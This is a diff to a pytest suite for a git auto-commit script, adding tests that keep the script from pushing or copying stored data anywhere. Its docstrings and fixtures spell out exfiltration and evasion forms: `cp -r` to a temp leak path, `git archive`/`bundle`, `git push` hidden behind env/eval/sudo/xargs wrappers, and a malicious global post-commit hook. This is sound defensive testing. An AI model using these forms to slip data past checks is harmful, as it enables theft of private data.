@@ -385,6 +385,35 @@ def test_a_configured_remote_is_never_pushed_to(tmp_path):
     assert refs == "", f"remote-tracking refs appeared: {refs}"
 
 
+def test_a_configured_remote_is_not_pushed_to_on_a_CLEAN_run(tmp_path):
+    """🔴 THE STEADY-STATE PATH, which the dirty-run test above never reaches.
+
+    That test writes `delta.md` before running, so it only ever exercises the
+    branch that stages and commits. The overwhelming majority of real runs are
+    the other one: nothing changed, "clean — nothing to commit", return early.
+    A push bolted onto THAT branch — a sync-on-every-run, say — would have moved
+    no assertion in this file.
+    """
+    store = _seed(tmp_path)
+    _run(store)
+    far_side = tmp_path / "far-side.git"
+    subprocess.run(["git", "init", "-q", "--bare", str(far_side)], check=True)
+    _git(store / "some-scope", "remote", "add", "origin", str(far_side))
+
+    p = _run(store)
+    assert p.returncode == 0, p.stderr
+    assert "clean — nothing to commit" in p.stdout, (
+        f"this run was not the clean path, so it proves nothing:\n{p.stdout}")
+
+    far_refs = subprocess.run(
+        ["git", "-C", str(far_side), "for-each-ref", "--format=%(refname)"],
+        capture_output=True, text=True).stdout.strip()
+    assert far_refs == "", f"a CLEAN run pushed refs to the far side: {far_refs}"
+    refs = _git(store / "some-scope", "for-each-ref", "--format=%(refname)",
+                "refs/remotes").stdout.strip()
+    assert refs == "", f"a CLEAN run created remote-tracking refs: {refs}"
+
+
 def test_the_far_side_fixture_would_actually_record_a_push(tmp_path):
     """🔴 POSITIVE CONTROL for the test above. Its two assertions are ZEROES,
     and a zero is indistinguishable from a fixture wired to nothing (RULES.md).
@@ -418,11 +447,28 @@ def test_a_run_writes_nothing_outside_the_store(tmp_path):
     client-sensitive data out of the store while every existing test passed. So:
     sandbox HOME, snapshot every path in the sandbox, run, and assert the only
     thing that changed is inside $STORE.
+
+    🔴 TMPDIR IS SANDBOXED TOO, and that is not tidiness. A later sweep wrote
+    `cp -r "$scope" "${TMPDIR:-/tmp}/leak"` and this test did NOT catch it: the
+    snapshot only ever covered its own sandbox, so the script's actual scratch
+    directory — the obvious place for a lazy exfil to land, and the one this
+    script demonstrably writes to — was outside the observed set entirely.
+
+    🔴 AND HERE IS WHAT IT STILL CANNOT SEE, stated rather than implied: a
+    mutant writing to a HARDCODED absolute path outside the sandbox is invisible
+    to any snapshot of this shape, because "everywhere else" is not enumerable.
+    That residue is exactly why the primary control is containment, not
+    detection — under the unit's ProtectSystem=strict/ProtectHome=tmpfs sandbox
+    there IS no writable path outside the store, so the hardcoded-path variant
+    fails at the kernel (MEASURED live: "Read-only file system"). This test is
+    the second line, and it is honest about being second.
     """
     sandbox = tmp_path / "sandbox"
     home = sandbox / "home"
+    scratch = sandbox / "scratch"
     (home / "workspace" / "devrc" / "claudedocs").mkdir(parents=True)
     (home / "asi-leak-sentinel").mkdir(parents=True)
+    scratch.mkdir(parents=True)
     store = _seed(sandbox)
     (sandbox / "bystander").mkdir()
     (sandbox / "bystander" / "keep.txt").write_text("untouched\n", encoding="utf-8")
@@ -437,7 +483,7 @@ def test_a_run_writes_nothing_outside_the_store(tmp_path):
         return out
 
     before = snapshot()
-    p = _run(store, HOME=str(home))
+    p = _run(store, HOME=str(home), TMPDIR=str(scratch))
     assert p.returncode == 0, p.stderr
     after = snapshot()
 
@@ -487,21 +533,44 @@ def _script_code_lines():
 # 🔴 THE ASSERTED LEDGER. The complete set of git subcommands commit.sh may
 # invoke. Kept in ONE place, mirrored by the header comment in the script.
 GIT_SUBCOMMAND_LEDGER = {
-    "add", "commit", "config", "diff", "init",
+    "add", "check-ignore", "commit", "config", "diff", "init",
     "ls-files", "rev-parse", "status", "var",
 }
 
-_GIT_CALL = re.compile(r"\bgit\b(?P<rest>[^|;&]*)")
+# `.git` is a directory name (`"${scope}/.git/*"`), never an invocation. Nothing
+# else may precede a real call — in particular a path prefix must NOT be excused,
+# or `/run/current-system/sw/bin/git push` becomes invisible.
+_GIT_CALL = re.compile(r"(?<!\.)\bgit\b(?P<rest>[^|;&]*)")
 
-# `git` counts as a CALL only in command position. Without this the word `git`
-# inside an error string ("git is not on PATH") parses as an invocation of a
-# subcommand called `is`. Command position = start of line, or straight after a
-# separator (`;` `&` `|` `(` including `$(` `&&` `||`), or after one of these
-# words. Deliberately NOT `}`, so `"${fail_prefix} git status failed"` — prose
-# inside a message — is rejected, while `$(git …)` inside the same message is
-# still seen.
+# `git` counts as a CALL only in command position. Command position = start of
+# line, or straight after a separator (`;` `&` `|` `(` including `$(` `&&` `||`,
+# `{` opening a brace group, `\` suppressing alias expansion), or after one of
+# these words.
+#
+# 🔴 `{` and `\` are here because they were MEASURED to evade: `{ git push; }`
+# and `\git push` both classified as not-a-call and were skipped silently.
 _CMD_WORDS = {"capture", "if", "then", "do", "else", "elif", "while", "until", "!"}
-_CMD_CHARS = (";", "&", "|", "(", "!")
+_CMD_CHARS = (";", "&", "|", "(", "!", "{", "\\")
+
+# 🔴 THE PROSE LEDGER — the residual, pinned as an EXACT SET.
+#
+# This is the fix for the class, not another pattern. The extractor used to
+# `continue` on any `git` it could not place in command position, which silently
+# excused every wrapper form: MEASURED, 8 of them (`env`, `timeout`, `nohup`,
+# `command`, `eval "…"`, `xargs`, `sudo`, and a bare `{`) reached `git push`
+# with the ledger reporting nothing at all.
+#
+# Now an unplaceable `git` is a VIOLATION unless it appears verbatim here. The
+# legitimate residual is prose inside message strings, and commit.sh consolidates
+# its failure reporting into one `git_failed` helper precisely so this list stays
+# three lines long and readable. Adding a wrapper call site cannot pass: it is
+# not in this set, so the set grows and the test fails. Rewording a message also
+# fails, deliberately — that is what "asserted" means.
+GIT_PROSE_LEDGER = {
+    'command -v git >/dev/null 2>&1 ||',
+    'echo "${PROG}: $1 git $2 failed (rc=$3)${4:+: $4}" >&2',
+    '|| echo "no repo — would git init -b ${ASI_BRANCH}")" ;;',
+}
 
 
 def _in_command_position(prefix: str) -> bool:
@@ -514,16 +583,23 @@ def _in_command_position(prefix: str) -> bool:
 
 
 def _git_subcommands_invoked():
-    """Every git subcommand actually invoked, plus every INDIRECT one.
+    """Classify EVERY `git` token in commit.sh. Nothing is silently dropped.
 
-    Returns (concrete, indirect). `indirect` holds call sites whose subcommand
-    comes from a variable — those are ledger violations by construction, because
-    no static reading can say what `$_s` expands to.
+    Returns (concrete, indirect, unclassified):
+      concrete     — subcommand names invoked in command position
+      indirect     — call sites whose subcommand comes from a variable; ledger
+                     violations by construction, since no static reading can say
+                     what `$_s` expands to
+      unclassified — every `git` that is NOT in command position. Prose in a
+                     message string looks exactly like `env git push` to a
+                     static reader, so these are not guessed at: they are
+                     compared against GIT_PROSE_LEDGER as an exact set.
     """
-    concrete, indirect = set(), []
+    concrete, indirect, unclassified = set(), [], []
     for line in _script_code_lines():
         for m in _GIT_CALL.finditer(line):
             if not _in_command_position(line[:m.start()]):
+                unclassified.append(line.strip())
                 continue
             toks = m.group("rest").split()
             i = 0
@@ -543,24 +619,31 @@ def _git_subcommands_invoked():
                 indirect.append(line.strip())
             else:
                 concrete.add(sub)
-    return concrete, indirect
+    return concrete, indirect, unclassified
 
 
 def test_the_set_of_git_subcommands_is_exactly_the_asserted_ledger():
     """🔴 AN ASSERTED LEDGER, NOT A BLOCKLIST — and it fails when the set GROWS
     *or* SHRINKS.
 
-    The previous version enumerated five forbidden verbs
-    (push/fetch/pull/clone/ls-remote). A sweep built differently walked past it
-    three times over: `git archive -o …`, `git bundle create …`, and a plain
-    `cp -r "$scope" …` are all exfiltration and none of them is on that list.
-    An allowlist has no such blind spot: anything not named here is a failure,
-    whether or not anybody thought to forbid it.
+    The original version enumerated five forbidden verbs
+    (push/fetch/pull/clone/ls-remote); `git archive -o …` and `git bundle
+    create …` walked straight past it. An allowlist closes that: anything not
+    named here is a failure, whether or not anybody thought to forbid it.
+
+    🔴 BUT BE HONEST ABOUT WHAT IT STILL CANNOT SEE. This reads *git* call
+    sites, so exfiltration that never invokes git is invisible to it — a plain
+    `cp -r "$scope" …` always was and always will be. An earlier revision of
+    this docstring claimed "an allowlist has no such blind spot", which was
+    false. The control that stops `cp -r` is the unit's sandbox
+    (ProtectHome=tmpfs + ProtectSystem=strict), pinned by
+    test_the_unit_is_contained_so_exfiltration_has_nowhere_to_go; this ledger is
+    secondary.
 
     Shrinking is a failure too — a ledger that silently tracks whatever the
     script happens to do is not an assertion about anything.
     """
-    concrete, indirect = _git_subcommands_invoked()
+    concrete, indirect, _ = _git_subcommands_invoked()
     assert not indirect, (
         "git subcommand supplied INDIRECTLY (via a variable or substitution); "
         "no static check can tell what it expands to, so this is a ledger "
@@ -577,10 +660,57 @@ def test_the_set_of_git_subcommands_is_exactly_the_asserted_ledger():
         "so the ledger keeps asserting something.")
 
 
+def test_every_unplaceable_git_token_is_pinned_prose():
+    """🔴 THE WRAPPER CLASS, CLOSED AT THE ROOT.
+
+    The extractor used to `continue` on a `git` it could not place in command
+    position. MEASURED on the pre-fix tree: that single `continue` made `env git
+    push`, `timeout 60 git push`, `nohup git push`, `command git push`, `eval
+    "git push"`, `xargs git push`, `sudo git push` and `{ git push; }` ALL
+    report an empty subcommand set — 8 wrapper forms, none of them on any
+    blocklist, none of them visible.
+
+    Enumerating wrappers would have been a fourth layer of the same mistake.
+    Instead the residual is pinned: anything not in GIT_PROSE_LEDGER fails,
+    whatever it happens to look like.
+    """
+    _, _, unclassified = _git_subcommands_invoked()
+    seen = set(unclassified)
+    surprising = sorted(seen - GIT_PROSE_LEDGER)
+    vanished = sorted(GIT_PROSE_LEDGER - seen)
+    assert not surprising, (
+        "commit.sh contains `git` in a position this checker cannot read as a "
+        f"call: {surprising}\n"
+        "  If that is a WRAPPED invocation (env/timeout/eval/xargs/sudo/…), it "
+        "is exactly the exfiltration path this test exists to stop — do not "
+        "pin it.\n"
+        "  If it is genuinely prose inside a message, prefer routing it through "
+        "the git_failed helper; only add it to GIT_PROSE_LEDGER if it truly "
+        "cannot be.")
+    assert not vanished, (
+        f"GIT_PROSE_LEDGER names line(s) commit.sh no longer contains: {vanished}. "
+        "Remove them, so this set keeps asserting something rather than "
+        "accumulating dead entries.")
+
+
 def test_the_ledger_extractor_sees_what_it_claims_to_see():
-    """🔴 POSITIVE CONTROL for the extractor. `added == []` is a zero, and a zero
-    is indistinguishable from a parser wired to nothing. Feed it lines it MUST
-    classify, including the two obfuscations that survived the old blocklist."""
+    """🔴 POSITIVE CONTROL for the extractor. `added == []` and `surprising ==
+    []` are ZEROES, and a zero is indistinguishable from a parser wired to
+    nothing (RULES.md). Feed it every form that MUST be caught and watch each
+    number move.
+
+    The wrapper rows are the regression: every one of them returned an empty
+    concrete set AND an empty indirect list on the pre-fix extractor.
+    """
+    wrapped = [
+        '  env git -C "$scope" push origin trunk',
+        '  timeout 60 git -C "$scope" push origin trunk',
+        '  nohup git -C "$scope" push origin trunk',
+        '  command git -C "$scope" push origin trunk',
+        '  eval "git -C $scope push origin trunk"',
+        '  echo trunk | xargs git -C "$scope" push origin',
+        '  sudo git -C "$scope" push origin trunk',
+    ]
     global _script_code_lines
     original = _script_code_lines
     try:
@@ -589,14 +719,36 @@ def test_the_ledger_extractor_sees_what_it_claims_to_see():
             '  git -C "$scope" archive -o /tmp/x.tar HEAD',
             '  _s=push; git -C "$scope" $_s origin trunk',
             '  git -C "$scope" status --porcelain',
+            '  { git -C "$scope" bundle create /tmp/x.bundle --all; }',
+            '  \\git -C "$scope" fetch origin',
         ]
-        concrete, indirect = _git_subcommands_invoked()
+        concrete, indirect, unclassified = _git_subcommands_invoked()
+
+        per_wrapper = {}
+        for line in wrapped:
+            _script_code_lines = (lambda l=line: [l])
+            c, i, u = _git_subcommands_invoked()
+            per_wrapper[line.strip()] = (sorted(c), bool(i), bool(u))
     finally:
         _script_code_lines = original
+
     assert "push" in concrete, "the extractor missed a plain `git push`"
     assert "archive" in concrete, "the extractor missed `git archive`"
     assert "status" in concrete, "the extractor missed the -C-prefixed `git status`"
+    assert "bundle" in concrete, (
+        "the extractor missed `{ git bundle …; }` — `{` is not being treated as "
+        "a command separator")
+    assert "fetch" in concrete, (
+        "the extractor missed `\\git fetch` — `\\` is not being treated as a "
+        "command separator")
     assert indirect, "the extractor did not flag a variable-supplied subcommand"
+    assert not unclassified, (
+        f"these call sites should all have been placed: {unclassified}")
+
+    for line, (c, ind, unc) in per_wrapper.items():
+        assert ind or unc or (set(c) - GIT_SUBCOMMAND_LEDGER), (
+            f"WRAPPER EVASION still invisible: {line!r} produced concrete={c}, "
+            f"indirect={ind}, unclassified={unc} — nothing a test could fail on")
 
 
 def test_the_script_never_blind_stages():
@@ -633,15 +785,25 @@ def test_asi_no_init_skips_an_uninitialised_scope(tmp_path):
 
 
 def test_an_identity_is_seeded_when_git_cannot_resolve_one(tmp_path):
-    """A systemd unit cannot answer git's "please tell me who you are". Point
-    HOME at an empty directory so no global config is visible."""
+    """A systemd unit cannot answer git's "please tell me who you are".
+
+    🔴 THIS TEST USED TO FAIL IN THE WORSE TIER DIRECTION: it was green in the
+    sandbox and RED on a host carrying a system-level /etc/gitconfig, because
+    pointing HOME at an empty directory neutralises only the GLOBAL config —
+    the system one is still read, resolves an identity, and no seeding happens.
+
+    It is now environment-independent by CONSTRUCTION rather than by fixture:
+    commit.sh exports GIT_CONFIG_NOSYSTEM=1 and GIT_CONFIG_GLOBAL=/dev/null for
+    every invocation, so no ambient config of either kind can reach git. The
+    test deliberately passes NO config-related environment at all — if it needed
+    to, the product would still be host-dependent.
+    """
     store = _seed(tmp_path)
-    empty_home = tmp_path / "empty-home"
-    empty_home.mkdir()
-    p = _run(store, HOME=str(empty_home), GIT_CONFIG_GLOBAL=str(empty_home / "none"))
+    p = _run(store)
     assert p.returncode == 0, p.stderr
     who = _git(store / "some-scope", "log", "-1", "--format=%an <%ae>").stdout
-    assert "analyze-service-index@localhost" in who
+    assert "analyze-service-index@localhost" in who, (
+        f"the seeded identity was not used (host gitconfig leaked in?): {who!r}")
 
 
 def test_an_existing_configured_identity_is_not_overridden(tmp_path):
@@ -802,7 +964,23 @@ def test_a_status_warning_on_stderr_is_not_mistaken_for_dirty_state(tmp_path):
 
 def test_a_status_warning_never_reaches_the_commit_message(tmp_path):
     """The other half of the same defect: `before` is pasted verbatim into the
-    commit body, so a warning line became part of the permanent history."""
+    commit body, so a warning line became part of the permanent history.
+
+    🔴 DELIBERATE CONTRACT CHANGE, recorded here because this test used to
+    assert rc=0 on exactly this fixture. An unreadable subdirectory also makes
+    `find` exit non-zero, and that exit code used to be DISCARDED (the candidate
+    list was piped straight into `sort -zu`). A scope was therefore enumerated
+    PARTIALLY and the run still reported success — index files that could not be
+    seen were silently never staged, which is the loss this unit exists to stop.
+
+    The new contract is protect-then-alarm, and this test now pins BOTH halves:
+      * everything readable IS still committed, with a clean message and an
+        uninflated count — the guarantee this test was written for; and
+      * the run FAILS, naming the incomplete enumeration, because part of the
+        scope is genuinely unaccounted for.
+    Refusing to commit at all would have been the wrong fix: a bad `sub/` would
+    then block `alpha.md` from ever being backed up.
+    """
     store = _seed(tmp_path)
     _run(store)
     blocked = store / "some-scope" / "sub"
@@ -813,27 +991,63 @@ def test_a_status_warning_never_reaches_the_commit_message(tmp_path):
         p = _run(store)
     finally:
         blocked.chmod(0o755)
-    assert p.returncode == 0, p.stderr
+
     msg = _git(store / "some-scope", "log", "-1", "--format=%B").stdout
     assert "Permission denied" not in msg, (
         f"a stderr warning was committed into the message body:\n{msg}")
     assert "1 change(s)" in msg, (
         f"the change count was inflated by warning lines:\n{msg}")
+    assert "CHANGED" in _git(store / "some-scope", "show", "HEAD:alpha.md").stdout, (
+        "the readable content was NOT committed — the enumeration guard is "
+        "causing the data loss it exists to prevent")
+    assert p.returncode != 0, (
+        "a partially-enumerated scope reported success; find's rc is being "
+        f"discarded again:\n{p.stdout}")
+    assert "enumeration was INCOMPLETE" in p.stderr, (
+        f"a DIFFERENT guard fired — this one is unreached:\n{p.stderr}")
 
 
-def _race_hook(scope, body):
-    """Install a pre-commit hook — a deterministic stand-in for a write landing
-    in the window between `git add` and `git commit`.
+def _racing_git(tmp_path, body, once=True):
+    """A deterministic stand-in for a write landing in the window between
+    `git add` and `git commit`. Returns a PATH value to pass to `_run`.
+
+    🔴 THIS USED TO BE A pre-commit HOOK, AND CANNOT BE ANY MORE. commit.sh now
+    pins `core.hooksPath` at an empty directory for every invocation — that is
+    the control which kills the ambient-git-config exfiltration path
+    (test_an_ambient_git_hook_does_not_fire). A hook-based fixture would
+    therefore never fire, and would go green while measuring NOTHING, which is
+    the exact failure mode this suite keeps closing elsewhere.
+
+    A PATH shim is also the more honest stand-in: the race being simulated is a
+    concurrent WRITER touching the store, not a hook the repo opted into. The
+    shim runs `body` when it first sees a literal `commit` argument, then execs
+    the real git.
 
     🔴 The shebang belongs to testlib.mockbin, not to this call site.
     `#!/usr/bin/env bash` works on the dev host and does NOT exist in the nix
-    build sandbox, so a hook written that way makes `git commit` fail with
-    "cannot exec" — the test then goes green-for-the-wrong-reason locally and
-    red in the authoritative tier (MEASURED: exactly that, both ways).
+    build sandbox (MEASURED: green locally, red in the authoritative tier).
     """
-    hooks = scope / ".git" / "hooks"
-    hooks.mkdir(parents=True, exist_ok=True)
-    return write_exec(hooks / "pre-commit", f"{body}\nexit 0\n")
+    real = shutil.which("git")
+    assert real, "git is not on PATH — the shim would recurse into itself"
+    bindir = tmp_path / "racebin"
+    bindir.mkdir(exist_ok=True)
+    marker = tmp_path / "raced.marker"
+    if once:
+        inner = (f'if [ ! -e "{marker}" ]; then\n'
+                 f'      {body}\n'
+                 f'      : > "{marker}"\n'
+                 f'    fi')
+    else:
+        inner = body
+    write_exec(bindir / "git", (
+        'for a in "$@"; do\n'
+        '  if [ "$a" = "commit" ]; then\n'
+        f'    {inner}\n'
+        '    break\n'
+        '  fi\n'
+        'done\n'
+        f'exec {real} "$@"\n'))
+    return f"{bindir}:{os.environ['PATH']}"
 
 
 def test_a_covered_file_written_during_the_commit_is_not_a_failure(tmp_path):
@@ -849,8 +1063,8 @@ def test_a_covered_file_written_during_the_commit_is_not_a_failure(tmp_path):
     _run(store)
     scope = store / "some-scope"
     (scope / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
-    _race_hook(scope, 'printf "raced\\n" > "$(git rev-parse --show-toplevel)/gamma.md"')
-    p = _run(store)
+    path = _racing_git(tmp_path, f'printf "raced\\n" > "{scope}/gamma.md"')
+    p = _run(store, PATH=path)
     assert p.returncode == 0, (
         f"a benign covered-file race failed the unit:\n{p.stderr}")
     assert "not covered by the *.md allowlist" not in p.stderr, (
@@ -871,14 +1085,100 @@ def test_a_genuinely_uncovered_file_is_still_a_loud_failure(tmp_path):
     _run(store)
     scope = store / "some-scope"
     (scope / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
-    _race_hook(scope, 'printf "x\\n" > "$(git rev-parse --show-toplevel)/secret.pem"')
-    p = _run(store)
+    path = _racing_git(tmp_path, f'printf "x\\n" > "{scope}/secret.pem"')
+    p = _run(store, PATH=path)
     assert p.returncode != 0, (
         f"an uncovered file surviving the commit was reported as success:\n{p.stdout}")
     assert "STILL DIRTY" in p.stderr, p.stderr
     assert "secret.pem" in p.stderr, p.stderr
     assert "neither matched by the *.md allowlist nor already tracked" in p.stderr
     assert "secret.pem" not in _git(scope, "ls-files").stdout
+
+
+def test_a_gitignored_index_file_is_reported_as_its_own_named_error(tmp_path):
+    """🔴 A `*.md` line in a scope's .gitignore makes EVERY index file in that
+    scope unversionable, forever.
+
+    What used to happen (MEASURED): `git add` failed with "The following paths
+    are ignored by one of your .gitignore files", the run exited 1, and it did
+    so byte-identically on every subsequent run. That reads as a tooling
+    complaint and buries the only fact that matters — this content is not being
+    backed up — behind a hint about `-f`. A permanently-red gate is worse than
+    no gate (RULES.md): it trains the operator to dismiss the toast.
+
+    Now it is pre-filtered through `git check-ignore` and reported by name,
+    before anything is staged.
+    """
+    store = _seed(tmp_path)
+    assert _run(store).returncode == 0
+    scope = store / "some-scope"
+    (scope / ".gitignore").write_text("*.md\n", encoding="utf-8")
+    (scope / "gamma.md").write_text("new index content\n", encoding="utf-8")
+
+    p = _run(store)
+    assert p.returncode != 0, "a permanently-unversionable index file exited 0"
+    assert "an index file is gitignored and will therefore never be versioned" in p.stderr, (
+        f"a DIFFERENT guard fired — the named error is unreached:\n{p.stderr}")
+    assert "gamma.md" in p.stderr, "the error does not name the affected path"
+    assert "ignored by one of your .gitignore files" not in p.stderr, (
+        "git's own message leaked through, which is the burying this fixes")
+    # 🔴 The index is left untouched — a half-staged scope means a human's next
+    # `git commit` in that directory picks up a surprise.
+    assert _git(scope, "diff", "--cached", "--name-only").stdout == "", (
+        "the run left paths staged in the index")
+
+
+def test_a_gitignore_that_does_not_match_the_index_is_not_flagged(tmp_path):
+    """🔴 NEGATIVE CONTROL for the check above — a `.gitignore` is not itself a
+    problem. Only one that swallows index files is. Without this, pre-filtering
+    could reject every scope carrying any .gitignore and nothing would notice."""
+    store = _seed(tmp_path)
+    assert _run(store).returncode == 0
+    scope = store / "some-scope"
+    (scope / ".gitignore").write_text("*.tmp\n", encoding="utf-8")
+    (scope / "gamma.md").write_text("new index content\n", encoding="utf-8")
+
+    p = _run(store)
+    assert "gitignored" not in p.stderr, (
+        f"a harmless .gitignore was flagged:\n{p.stderr}")
+    assert "gamma.md" in _git(scope, "ls-files").stdout, (
+        "the new index file was not committed")
+
+
+def test_a_chronically_racing_scope_exits_0_but_leaves_a_greppable_marker(tmp_path):
+    """🔴 PINNING A JUDGEMENT CALL. Both mutants of this branch survived the
+    previous round: returning 1 instead of warning, and changing the two-pass
+    cadence.
+
+    The decision is right — nothing has been lost, every remaining path is
+    covered, and the next run commits it, so failing the unit would fire a
+    critical toast for a non-event. But exit 0 means a scope that races EVERY
+    day is invisible in `systemctl status` forever. So the marker is asserted
+    alongside the exit code: rc=0 AND the specific warning AND a token that
+    `journalctl … | grep ASI-RACE-UNSETTLED` can count.
+
+    A writer that never stops is what reaches this branch — `once=False`.
+    """
+    store = _seed(tmp_path)
+    _run(store)
+    scope = store / "some-scope"
+    (scope / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
+    path = _racing_git(
+        tmp_path,
+        f'printf "race-$$\\n" > "{scope}/racing.md"',
+        once=False)
+
+    p = _run(store, PATH=path)
+    assert p.returncode == 0, (
+        "a self-healing race was turned into a FAILED unit — nothing is lost on "
+        f"this path, so it must not fire the critical toast:\n{p.stderr}")
+    assert "ASI-RACE-UNSETTLED" in p.stderr, (
+        "the greppable marker is gone; a scope racing every day is now "
+        f"invisible behind exit 0:\n{p.stderr}")
+    assert "still dirty after two passes" in p.stderr, (
+        f"the specific warning text changed:\n{p.stderr}")
+    assert "STILL DIRTY" not in p.stderr, (
+        "the covered-race path reported the uncovered-path failure message")
 
 
 def test_a_dirty_tree_with_no_candidate_paths_fails_loudly(tmp_path):
@@ -960,6 +1260,73 @@ def test_a_scope_reached_through_a_symlink_is_still_versioned(tmp_path):
     assert "alpha.md" in _git(real, "ls-files").stdout
 
 
+def test_a_symlinked_subdirectory_inside_a_scope_does_not_wedge_the_scope(tmp_path):
+    """🔴 A LIVE REGRESSION INTRODUCED BY THE PREVIOUS FIX ROUND, and the reason
+    `-L` now appears on exactly one find in commit.sh.
+
+    Fixing symlinked-SCOPE enumeration by putting `-L` on the CANDIDATE walk too
+    made it descend into symlinked subdirectories and emit paths beyond them.
+    git refuses those pathspecs — `fatal: pathspec 'linkdir/inner.md' is beyond
+    a symbolic link` — so `git add` exited 128 and the scope FAILED. MEASURED on
+    that tree: byte-identical failure on the next run, i.e. it never self-heals,
+    and `git ls-files` stayed EMPTY — the scope's real index files were left
+    completely unversioned for as long as the symlink existed.
+
+    What must happen instead: the scope's genuine `*.md` content is committed,
+    and the symlink is reported as an uncovered path (which is the documented
+    treatment for anything in a scope that is not an index file). Content
+    protected first; the surprise still loud.
+    """
+    store = tmp_path / "store"
+    scope = store / "some-scope"
+    scope.mkdir(parents=True)
+    (scope / "alpha.md").write_text("real content\n", encoding="utf-8")
+    outside = tmp_path / "outside" / "deep"
+    outside.mkdir(parents=True)
+    (outside / "inner.md").write_text("beyond the link\n", encoding="utf-8")
+    (scope / "linkdir").symlink_to(outside, target_is_directory=True)
+
+    p = _run(store)
+    assert "beyond a symbolic link" not in p.stderr, (
+        f"the -L regression is back — git refused a pathspec:\n{p.stderr}")
+    assert "alpha.md" in _git(scope, "ls-files").stdout, (
+        "the scope's real index file was left unversioned by a symlinked "
+        f"subdirectory:\nstdout={p.stdout}\nstderr={p.stderr}")
+    assert p.returncode != 0, "the unexpected symlink was not reported at all"
+    assert "linkdir" in p.stderr
+
+
+def test_a_scope_whose_only_markdown_is_beyond_a_symlink_is_not_bootstrapped(tmp_path):
+    """🔴 THE PROBE/WALK SEAM. Two finds decide different things about the same
+    scope: the `md_probe` decides whether to CREATE a repository, and
+    list_candidates decides what can be STAGED. If they disagree about what
+    exists, the script bootstraps a repository it can never populate and then
+    fails on it every day.
+
+    Found by mutating the probe's `-H` back to `-L` in isolation: nothing in the
+    suite moved. With `-L` the probe sees a `.md` beyond a symlinked
+    subdirectory and bootstraps; the candidate walk (correctly `-H`) cannot
+    stage it, so the run ends "tree is dirty but no candidate paths were
+    enumerated" — permanently. Both finds must answer the same question.
+    """
+    store = tmp_path / "store"
+    scope = store / "some-scope"
+    scope.mkdir(parents=True)
+    outside = tmp_path / "outside"
+    outside.mkdir()
+    (outside / "inner.md").write_text("beyond the link\n", encoding="utf-8")
+    (scope / "linkdir").symlink_to(outside, target_is_directory=True)
+
+    p = _run(store)
+    assert p.returncode == 0, (
+        f"a scope with no stageable content failed instead of skipping:\n{p.stderr}")
+    assert not (scope / ".git").exists(), (
+        "a repository was bootstrapped for a scope whose only *.md is beyond a "
+        "symlink and therefore can never be staged — the probe and the "
+        "candidate walk disagree")
+    assert "skipping" in p.stdout
+
+
 def test_print_plan_is_honoured_after_the_store_argument(tmp_path):
     """🔴 M5. `--print-plan` was recognised only as $1, so
     `commit.sh <STORE> --print-plan` took the COMMITTING path — MEASURED: it
@@ -1027,8 +1394,14 @@ def test_commit_signing_is_pinned_off_for_the_scope(tmp_path):
 
 
 def test_a_scope_still_commits_when_signing_is_forced_on_globally(tmp_path):
-    """🔴 The behavioural half: pin the setting AND prove it wins. Force signing
-    on in a sandbox global config and confirm the commit still lands."""
+    """🔴 The behavioural half: pin the setting AND prove it wins.
+
+    Two independent controls now stop a global `commit.gpgsign=true` wedging the
+    timer on a GPG prompt — the local `commit.gpgsign false` pin, and the
+    wholesale GIT_CONFIG_GLOBAL neutralisation. This asserts the OUTCOME, which
+    is what the operator cares about, so it stays honest whichever control is
+    doing the work.
+    """
     store = _seed(tmp_path)
     home = tmp_path / "home"
     home.mkdir()
@@ -1043,13 +1416,350 @@ def test_a_scope_still_commits_when_signing_is_forced_on_globally(tmp_path):
     assert _commits(store / "some-scope") == 1
 
 
-def test_the_units_path_provides_git():
-    """A user unit does not inherit the login PATH. Without git on it the script
-    exits 1 by design — but every day, forever."""
+def test_an_ambient_git_hook_does_not_fire(tmp_path):
+    """🔴 THE EXFILTRATION PATH THAT NEEDED NO EDIT TO commit.sh AT ALL.
+
+    MEASURED on the pre-fix tree (git 2.55.0), end to end: a global
+    `[core] hooksPath = <dir>` holding a post-commit hook copied a scope's
+    client-identifying content clean out of the store, while commit.sh printed
+    "committed <sha>" and "ok — 1 scope(s) processed" and exited 0. The static
+    subcommand ledger is structurally incapable of seeing this — the payload was
+    in ~/.gitconfig, not in the script.
+
+    `init.templateDir` is the same attack one level earlier: it bakes the hook
+    into the repository THIS SCRIPT bootstraps, so it fires even on a scope that
+    did not exist when the config was written. Both are asserted here.
+    """
+    store = _seed(tmp_path)
+    home = tmp_path / "home"
+    hooks = tmp_path / "evilhooks"
+    tmpl = tmp_path / "eviltemplate" / "hooks"
+    fired = tmp_path / "FIRED"
+    home.mkdir()
+    hooks.mkdir()
+    tmpl.mkdir(parents=True)
+    write_exec(hooks / "post-commit", f'echo hooksPath >> "{fired}"\n')
+    write_exec(tmpl / "post-commit", f'echo templateDir >> "{fired}"\n')
+    gitconfig = home / "gitconfig"
+    gitconfig.write_text(
+        "[user]\n\tname = T\n\temail = t@example.com\n"
+        f"[core]\n\thooksPath = {hooks}\n"
+        f"[init]\n\ttemplateDir = {tmpl.parent}\n", encoding="utf-8")
+
+    p = _run(store, HOME=str(home), GIT_CONFIG_GLOBAL=str(gitconfig))
+    assert p.returncode == 0, p.stderr
+    assert _commits(store / "some-scope") == 1, "the run did not actually commit"
+    assert not fired.exists(), (
+        "an ambient git hook FIRED during the run — arbitrary code ran with the "
+        f"store readable: {fired.read_text(encoding='utf-8')!r}")
+    assert not (store / "some-scope" / ".git" / "hooks" / "post-commit").exists(), (
+        "init.templateDir baked a hook into the repo this script bootstrapped")
+
+
+def test_no_ambient_global_config_reaches_git_at_all(tmp_path):
+    """🔴 PINS `GIT_CONFIG_GLOBAL=/dev/null` SPECIFICALLY.
+
+    Found by the sweep: deleting that export killed NOTHING, because the
+    `core.hooksPath`/`init.templateDir` env pins independently blocked the hook
+    the other test uses. Two controls each sufficient for one attack is good
+    defence in depth and bad coverage — neither was individually observable.
+
+    The hook tests cannot distinguish them; an ambient key that is NOT a hook
+    can. `[user]` is ideal: if global config were honoured, git would resolve
+    that identity and the script would not seed its own. It also states the
+    guarantee at full width — the fix is not "dangerous keys are blocked", it is
+    "no ambient global config is read", every key.
+    """
+    store = _seed(tmp_path)
+    home = tmp_path / "home"
+    home.mkdir()
+    gitconfig = home / "gitconfig"
+    gitconfig.write_text(
+        "[user]\n\tname = Ambient Operator\n\temail = ambient@example.com\n",
+        encoding="utf-8")
+
